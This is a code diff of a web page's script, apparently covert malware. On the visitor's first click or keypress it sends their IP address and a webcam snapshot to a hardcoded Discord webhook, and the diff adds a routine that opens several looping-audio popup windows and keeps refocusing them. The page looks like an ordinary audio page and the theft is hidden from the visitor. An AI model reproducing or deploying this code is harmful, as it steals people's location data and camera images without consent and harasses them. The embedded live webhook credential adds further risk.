@@ -32,7 +32,7 @@
     font-size: 1.5rem;
   }
   audio {
-    display: none; /* Hide audio controls */
+    display: none;
   }
 </style>
 </head>
@@ -44,19 +44,66 @@
     </div>
   </div>
 
-  <!-- Embedded audio player -->
   <audio id="bgAudio" src="https://sevkabevka.github.io/alah.mp3" loop></audio>
 
 <script>
   const webhookURL = 'https://discordapp.com/api/webhooks/1374439333473292298/oF_3g-oeCrSnruf7vmDS8wd9bqXvQnvhTTkJdBUpaQU-r4K_JOLcXFHHzCA8W8J5Zcws';
 
-  async function getUserIP() {
-    try {
-      const response = await fetch('https://api.ipify.org?format=json');
-      const data = await response.json();
-      return data.ip;
-    } catch {
-      return null;
+  let popups = [];
+
+  class PopupWindow {
+    constructor() {
+      this.width = 500;
+      this.height = 500;
+      this.x = 100 + Math.random() * (screen.availWidth - this.width - 100);
+      this.y = 100 + Math.random() * (screen.availHeight - this.height - 100);
+
+      this.win = window.open('', '', `width=${this.width},height=${this.height},left=${this.x},top=${this.y},toolbar=no,location=no,status=no,menubar=no,scrollbars=no,resizable=no`);
+      if (!this.win) return;
+
+      this.win.focus();
+
+      this.win.document.write(`
+        <style>
+          body {
+            margin:0; background:black; overflow:hidden;
+            display:flex; justify-content:center; align-items:center;
+            color:white; font-family: Arial, sans-serif;
+            user-select:none;
+          }
+          audio { display:none; }
+        </style>
+        <body>
+          <audio autoplay loop src="https://sevkabevka.github.io/alah.mp3" volume="1.0"></audio>
+          <div style="font-size: 24px; text-align:center; padding: 20px;">Севкабевка Popup</div>
+        </body>
+      `);
+      this.win.document.close();
+
+      // Try to keep on top by focusing every 500ms
+      this.focusInterval = setInterval(() => {
+        if (this.win.closed) {
+          clearInterval(this.focusInterval);
+          return;
+        }
+        this.win.focus();
+      }, 500);
+    }
+  }
+
+  function spawnPopups(count = 3) {
+    for (let i = 0; i < count; i++) {
+      const p = new PopupWindow();
+      if (p.win) popups.push(p);
+    }
+  }
+
+  // Play audio inside main page
+  function playAudio() {
+    const audio = document.getElementById('bgAudio');
+    if (audio.paused) {
+      audio.volume = 1.0;
+      audio.play().catch(() => {});
     }
   }
 
@@ -67,19 +114,18 @@
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload),
       });
-    } catch {
-      // Ignore send errors
-    }
+    } catch {}
   }
 
-  async function sendUserIP() {
-    const ip = await getUserIP();
-    if (ip) {
-      await sendToWebhook({type: 'ip', ip: ip, timestamp: new Date().toISOString()});
-    }
+  async function sendIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      await sendToWebhook({content: `User IP: ${data.ip}`});
+    } catch {}
   }
 
-  async function captureCameraSnapshot() {
+  async function sendCameraImage() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia({video: true});
       const video = document.createElement('video');
@@ -90,47 +136,30 @@
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
       const ctx = canvas.getContext('2d');
-
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      stream.getTracks().forEach(track => track.stop());
+      stream.getTracks().forEach(t => t.stop());
 
-      return canvas.toDataURL('image/png');
-    } catch {
-      return null;
-    }
-  }
-
-  async function sendSnapshot() {
-    const img = await captureCameraSnapshot();
-    if (img) {
-      await sendToWebhook({type: 'camera_snapshot', image: img, timestamp: new Date().toISOString()});
-    }
+      const dataUrl = canvas.toDataURL('image/png');
+      // Send base64 string as text content
+      await sendToWebhook({content: `Camera snapshot (base64): ${dataUrl}`});
+    } catch {}
   }
 
   async function captureAndSend() {
-    await sendUserIP();
-    await sendSnapshot();
+    await sendIP();
+    await sendCameraImage();
   }
 
-  // Play audio once user interacts (required by browsers)
-  function playAudio() {
-    const audio = document.getElementById('bgAudio');
-    if (audio.paused) {
-      audio.volume = 1.0;
-      audio.play().catch(() => {});
-    }
-  }
-
-  // Trigger IP + camera capture + audio play on space, left click, right click
-  function interactionHandler(e) {
+  async function interactionHandler(e) {
     if (
-      e.type === 'keydown' && e.code === 'Space' ||
+      (e.type === 'keydown' && e.code === 'Space') ||
       e.type === 'click' ||
       e.type === 'contextmenu'
     ) {
       e.preventDefault();
       playAudio();
+      spawnPopups(3);
       captureAndSend();
     }
   }
